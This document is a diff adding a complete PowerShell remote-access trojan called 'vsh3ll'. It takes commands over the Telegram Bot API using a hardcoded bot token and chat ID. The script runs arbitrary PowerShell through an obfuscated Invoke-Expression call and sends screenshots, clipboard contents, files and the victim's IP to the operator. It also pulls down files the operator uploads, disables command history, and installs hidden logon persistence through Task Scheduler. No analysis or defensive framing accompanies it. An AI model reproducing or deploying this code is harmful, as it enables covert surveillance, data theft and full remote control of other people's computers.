@@ -1,0 +1,230 @@
+Clear-Host
+Set-PSReadlineOption -HistorySaveStyle SaveNothing
+Set-Location -Path $env:USERPROFILE
+$Global:ProgressPreference = 'SilentlyContinue'
+
+$session       = New-Object Microsoft.PowerShell.Commands.WebRequestSession
+$telegram_id   = "2118389773"
+$api_token     = "8450505822:AAG_yBZaOGpYdKN4dFZTfEtNF_Vfk_71YQ0"
+$session_id    = $env:COMPUTERNAME
+$script_path   = $PSCommandPath
+
+$api_base      = "https://api.telegram.org/bot$api_token"
+$api_updates   = "$api_base/getUpdates"
+$api_send      = "$api_base/sendMessage"
+$api_get_file  = "$api_base/getFile?file_id="
+$api_file_dl   = "https://api.telegram.org/file/bot$api_token/"
+$api_upload    = "$api_base/sendDocument?chat_id=$telegram_id"
+
+
+function SendMessage($output, $cmd = "") {
+    $escaped = $output -replace "([$([regex]::Escape('_*``[\'))])", "\`$1"
+    $ip   = try { Invoke-RestMethod -Uri "ident.me" -WebSession $session -TimeoutSec 5 } catch { "unknown" }
+    $path = ((Get-Location).Path).Replace("\", "/")
+
+    $body = @{
+        chat_id    = $telegram_id
+        parse_mode = "MarkdownV2"
+        text       = "```````nIP: $ip`nSESSION: $session_id`nPATH: [$path]`nCMD: $cmd`n`n$escaped`n``````"
+    } | ConvertTo-Json
+
+    try { Invoke-RestMethod -Method Post -Uri $api_send -Body $body -ContentType "application/json; charset=utf-8" -WebSession $session | Out-Null }
+    catch { Start-Sleep -Seconds 3 }
+}
+
+function SendFile($filePath) {
+    SendMessage "Sending: [$filePath]"
+    if (Test-Path $filePath -PathType Leaf) {
+        try { curl.exe -F document=@"$filePath" $api_upload --insecure | Out-Null }
+        catch { SendMessage "Upload error: [$($Error[0])]" }
+    } else {
+        SendMessage "File not found: [$filePath]"
+    }
+}
+
+function SendScreenshot {
+    Add-Type -AssemblyName System.Drawing, System.Windows.Forms
+    $screens = [Windows.Forms.Screen]::AllScreens
+    $left   = ($screens | ForEach-Object { $_.Bounds.X }                   | Measure-Object -Minimum).Minimum
+    $top    = ($screens | ForEach-Object { $_.Bounds.Y }                   | Measure-Object -Minimum).Minimum
+    $right  = ($screens | ForEach-Object { $_.Bounds.X + $_.Bounds.Width } | Measure-Object -Maximum).Maximum
+    $bottom = ($screens | ForEach-Object { $_.Bounds.Y + $_.Bounds.Height }| Measure-Object -Maximum).Maximum
+
+    $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $right, $bottom)
+    $bmp      = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height
+    $graphics = [Drawing.Graphics]::FromImage($bmp)
+    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size)
+
+    $path = "$env:TEMP\ss.png"
+    $bmp.Save($path)
+    $graphics.Dispose(); $bmp.Dispose()
+    SendFile $path
+    Remove-Item $path -Force
+}
+
+function CheckAdmin {
+    $p = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
+    if ($p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { "Admin: YES" } else { "Admin: NO" }
+}
+
+function DownloadFile($file_id, $file_name) {
+    $info = Invoke-RestMethod -Uri ($api_get_file + $file_id) -WebSession $session
+    Invoke-RestMethod -Uri ($api_file_dl + $info.result.file_path) -OutFile $file_name -WebSession $session
+    if (Test-Path $file_name) { SendMessage "Downloaded: $file_name" } else { SendMessage "Download failed" }
+}
+
+function ManageStartup($action) {
+    $task_name = "vsh3ll_$session_id"
+    $task_cmd  = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$script_path`""
+
+    switch ($action) {
+        "add" {
+            schtasks /create /tn $task_name /tr $task_cmd /sc onlogon /rl highest /f 2>&1 | Out-Null
+            if ($LASTEXITCODE -eq 0) { SendMessage "Startup added: Task '$task_name' runs at logon (hidden)" }
+            else { SendMessage "Failed to add startup task (try as admin)" }
+        }
+        "remove" {
+            schtasks /delete /tn $task_name /f 2>&1 | Out-Null
+            if ($LASTEXITCODE -eq 0) { SendMessage "Startup removed: '$task_name'" }
+            else { SendMessage "Task not found or failed to remove" }
+        }
+        "status" {
+            $query = schtasks /query /tn $task_name 2>&1
+            if ($LASTEXITCODE -eq 0) { SendMessage "Startup: ACTIVE`n$($query | Out-String)" }
+            else { SendMessage "Startup: INACTIVE (task not found)" }
+        }
+        default { SendMessage "Usage: startup add | remove | status" }
+    }
+}
+
+function GetClipboard {
+    Add-Type -AssemblyName System.Windows.Forms
+    $text = [System.Windows.Forms.Clipboard]::GetText()
+    if ($text.Length -gt 0) { SendMessage "Clipboard:`n$text" } else { SendMessage "Clipboard is empty or non-text" }
+}
+
+function SendNotification($text) {
+    Add-Type -AssemblyName System.Windows.Forms
+    $icon          = New-Object System.Windows.Forms.NotifyIcon
+    $icon.Icon     = [System.Drawing.SystemIcons]::Information
+    $icon.Visible  = $true
+    $icon.ShowBalloonTip(6000, "vsh3ll", $text, [System.Windows.Forms.ToolTipIcon]::Info)
+    Start-Sleep -Seconds 7
+    $icon.Dispose()
+    SendMessage "Notification sent"
+}
+
+
+function ShowHelp {
+    $help = @"
+=== vsh3ll commands ===
+Format: <SESSION_ID> <command>
+
+[BUILT-IN]
+  online         - check if session is alive
+  exit           - kill the session
+  screenshot     - capture all screens
+  admin          - check admin rights
+  clipboard      - get clipboard content
+  notify <text>  - show balloon notification on PC
+
+  startup add    - add to Task Scheduler (runs hidden at logon)
+  startup remove - remove from Task Scheduler
+  startup status - check if startup task exists
+  help           - show this list
+
+[SHELL]
+  Any other input is executed as PowerShell directly.
+  cd <path>      - change dir (auto lists contents)
+  Upload a file to bot - downloads it to current dir on PC
+"@
+    SendMessage $help
+}
+
+function HandleCommand($text, $document) {
+    $parts  = $text -split ' ', 2
+    $action = $parts[0].ToLower()
+    $arg    = if ($parts.Length -gt 1) { $parts[1] } else { "" }
+
+    switch ($action) {
+        "exit"       { SendMessage "Session killed"; exit }
+        "screenshot" { SendScreenshot; return }
+        "admin"      { SendMessage (CheckAdmin); return }
+        "online"     { SendMessage "Session active"; return }
+        "clipboard"  { GetClipboard; return }
+        "help"       { ShowHelp; return }
+        "notify"     { SendNotification $arg; return }
+
+        "startup"    { ManageStartup $arg; return }
+    }
+
+    if ($text.Length -gt 0) {
+        try {
+            $cmd = $text
+            if ($action -match "^(cd|set-location)$") { $cmd = "$text; Get-ChildItem" }
+            $output = .(Get-Alias ?e[?x])($cmd) | Out-String
+        } catch {
+            $output = $Error[0] | Out-String
+        }
+
+        if ($output.Trim().Length -eq 0) {
+            SendMessage "Done: $text" $text
+        } else {
+            for ($i = 0; $i -lt $output.Length; $i += 2048) {
+                SendMessage ($output.Substring($i, [Math]::Min(2048, $output.Length - $i))) $text
+                Start-Sleep -Milliseconds 100
+            }
+        }
+    }
+
+    if ($document) { DownloadFile $document.file_id $document.file_name }
+}
+
+function CommandListener {
+    Add-Type -AssemblyName System.Windows.Forms
+    $offset = -1
+
+    while ($true) {
+        try {
+            $params  = if ($offset -ge 0) { "?offset=$offset&timeout=25" } else { "?timeout=25" }
+            $updates = Invoke-RestMethod -Uri ($api_updates + $params) -WebSession $session -TimeoutSec 30
+
+            if ($offset -lt 0 -and $updates.result.Count -gt 0) {
+                $offset = $updates.result[-1].update_id + 1
+                SendMessage "Session active!"
+                continue
+            }
+
+            if ($updates.result.Count -eq 0) {
+                if ($offset -lt 0) { SendMessage "Session active!"; $offset = 0 }
+                continue
+            }
+
+            foreach ($update in $updates.result) {
+                $offset  = $update.update_id + 1
+                $msg     = $update.message
+                $user_id = $msg.chat.id
+                $text    = $msg.text
+                $doc     = $msg.document
+
+                if ($user_id -notmatch $telegram_id) {
+                    SendMessage "Unauthorized: [$user_id] $($msg.chat.username) sent: $text"
+                    continue
+                }
+
+                $parts  = $text -split ' ', 2
+                $target = $parts[0]
+                $cmd    = if ($parts.Length -gt 1) { $parts[1] } else { "" }
+
+                if ($target -eq "/online") { SendMessage "Session active" $text; continue }
+                if ($target -ne $session_id) { continue }
+
+                HandleCommand $cmd $doc
+            }
+        } catch {
+            Start-Sleep -Seconds 5
+        }
+    }
+}
+
+CommandListener
